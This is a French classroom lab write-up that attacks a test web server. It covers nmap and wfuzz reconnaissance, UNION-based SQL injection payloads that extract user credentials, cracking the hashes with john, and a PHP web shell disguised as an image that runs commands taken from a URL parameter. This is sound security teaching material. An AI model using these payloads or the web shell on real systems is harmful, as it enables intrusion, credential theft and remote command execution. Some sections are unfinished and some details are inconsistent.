---
title: "TDM : Injection SQL"
date: 2019-02-21
categories: ['Sécurité', 'TD machine']
tags : ['wfuzz', 'site Internet', 'SQL', 'kali']
---

Le but de ce TD est d'utiliser les injection SQL pour s'introduire dans un site
Internet et d'utiliser celui-ci pour prendre le contrôle de la machine. Nous
allons utiliser des logiciels comme [burp suite][l-burpsuite], [wfuzz][l-wfuzz]
et [BeEf][l-beef].

## Trouver la machine à attaquer

Avant de commences toute attaque, il faut trouver une victime. Comme pour le TDM
sur les attaques réseau, nous allons utiliser `nmap`.  La machine à attaquer
étant sur le même réseau que nous, commençons par trouver notre ip avec la
commande suivante : 

```
ip -4 a show dev wlan0 | grep inet | cut -d ' ' -f 6 
172.16.8.234/24
```

Il nous suffit maintenant de chercher une machine dans le réseau
`172.16.8.0/24`:

```
nmap -sS -p 80 --open 172.16.8.0/24

[...]
Nmap scan report for 172.16.8.189
Host is up (0.0057s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: XX:XX:XX:XX:XX:48 (Virtual Machine)

[...]
```

Nous avons repérer la machine à attaquer, mais ne nous arrêtons pas en si bon
chemin, il est tout à fait possible d'en apprendre un peu plus avec `nmap -sC`
pour peut-être découvrir quelque chose d'exploitable.

## Faire le tour du propriétaire

Connectons nous maintenant sur le site avec notre navigateur et promenons nous
sur le site. C'est un blog photo en PHP qui affiche des images de façon
dynamique. En analysant le code source de la page

## trouver des URL "cachées"

Il est probable que certaines parties du site soit cachées comme par exemple
les pages d'administration. Utilisons [wfuzz][l-wfuzz], logiciel d'analyse de
site par bruteforce.

```
wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt -p --hc 404 http://172.16.8.189/FUZZ
```


## Exfilter des données

La page d'affichage des images semble être sensible à l'injection d'une requête
SQL par la méthode HTTP GET (directement dans l'URL). La requête de sélection
des photos semble être de la forme :

```SQL
SELECT * FROM <t_photo> WHERE <t_photo>.id = id;
```

L'URL de la page est alors `http://172.16.8.186/picture.php?picture=id`

### utiliser la clause UNION pour extraire des données

La clause SQL `UNION` va nous permettre d'ajouter des informations extraites de
la base par le biais de cette page mais attention : la seconde partie de la
requête (après le `UNION`) devra comporter le même nombre de colonnes que la
première.

#### Utiliser ORDER BY pour trouver le nombre de colonnes

Pour trouver ce fameux nombre de colonnes, nous allons utiliser la clause `ORDER
BY` et procéder par dichotomie : classons les résultats en commençant par la
colonne 10 L'URL est alors : 

```
http://172.16.8.189/picture.php?picture=1' ORDER BY 10
```

En cas d'erreur utilisons la colonne 5 sinon passons la 20 et ainsi
de suite jusqu'à trouver le bon nombre.

Dans le cadre du TP, le nombre de colonnes est **4**

### Trouver le schéma de la base de données

Pour mener une action efficace, nous devons **en apprendre plus sur le schéma de
cette base**. Dans chaque SGBDR, les information relative aux base sont stockée
dans une table spécifique. Mysql / MariaDB étant le plus utilisé des SGBDR, nous
allons tenter de rechercher dans ce sens : 

```SQL
UNION SELECT 1,concat(table_name,";",column_name),1,1
FROM information_schema.columns
```

L'URL est alors : 

```
http://172.16.8.189/picture.php?picture=1' SELECT 1,concat(table_name,":", [...]
```

Bien vu, la page affiche maintenant les informations demandées, nous avons
trouvé la table intéressante et ses champs :

```
users.id
users.login
users.passwd
```

### Extraire les identifiants

Nous avons maintenant toutes les cartes en main pour extraire les identifiants
des comptes utilisateurs du site, la requête est alors :

```SQL
UNION SELECT 1,concat(login,":",passwd),1,1
FROM users
```

Les identifiants récupérés seront sous la forme `user:pass`, il suffit de les
enregistrer dans un fichier texte pour les passer ensuite à `john`.

## Casser les mots de passes.

Les mots de passe récupérés vont être passé à `john` avec en paramètre une liste
de mots de passe les plus connu. Il est aussi possible de soumettre directement
des `hashes` des mots de passes à un moteur de recherche (Google par exemple).

```shell
john -format=raw-MD5 --wordlist=biglist.txt extracted_pass.txt
```

Dans le cadre du TDM, les deux mots de passes récupérés ont été trouvés dont
celui du compte `admin`.

## Se connecter à la partie administration du site

## Uploader un fichier php

Il est temps maintenant temps de créer un fichier php malveillant et de
l'uploader sur le serveur. Le but pourrait être de masquer complètement notre
script : s'il est appelé avec un paramètre il exécute le paramètre comme une
commande, sinon il affiche une image déjà existante sur le serveur : 

```php
<?php

if ($_GET["c"]) {
	$cmd = system($_GET["c"],$ret);
	echo $cmd;
}
else {
	$name = 'hackerman.jpeg';
	$fp = fopen($name, 'rb');

	// send the right headers
	header("Content-Type: image/png");
	header("Content-Length: " . filesize($name));
	// dump the picture and stop the script
	fpassthru($fp);
	exit;
}
?>
```
[l-burpsuite]:https://portswigger.net/burp
[l-wfuzz]:https://github.com/xmendez/wfuzz
[l-BeEf]:https://beefproject.com/
